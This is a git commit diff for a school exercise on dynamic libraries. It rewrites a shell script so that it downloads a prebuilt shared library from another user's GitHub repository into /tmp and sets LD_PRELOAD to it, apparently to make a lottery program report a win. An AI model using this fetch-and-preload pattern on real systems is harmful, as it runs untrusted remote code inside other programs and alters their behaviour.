3dd2e18699ae0e4f6569011ba1ba3c3885cb94f0
254jack <taixonj@gmail.com>
2023-08-21 17:13:07 +0300

    101-make_me_win.sh

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,4 +1,3 @@
 #!/bin/bash
-sleep 2
-./gm 9 8 10 24 75 9
-
+wget -O /tmp/win.so https://github.com/Zevrov/holbertonschool-low_level_programming/raw/master/0x17-dynamic_libraries/win.so
+export LD_PRELOAD=/tmp/win.so
